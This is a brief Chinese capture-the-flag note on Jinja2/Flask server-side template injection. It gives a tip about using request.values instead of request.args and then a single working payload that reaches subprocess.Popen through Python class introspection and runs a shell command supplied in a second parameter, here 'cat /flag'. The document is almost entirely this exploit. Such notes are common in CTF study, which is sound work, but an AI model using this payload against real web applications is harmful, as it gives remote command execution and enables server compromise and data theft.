# 知识点
requests.args.a可以替换成requests.values.a
# 思路
```python
?name={{().__class__.__mro__[1].__subclasses__()[407](request.values.a,shell=True,stdout=-1).communicate()[0]}}&a=cat /flag
```
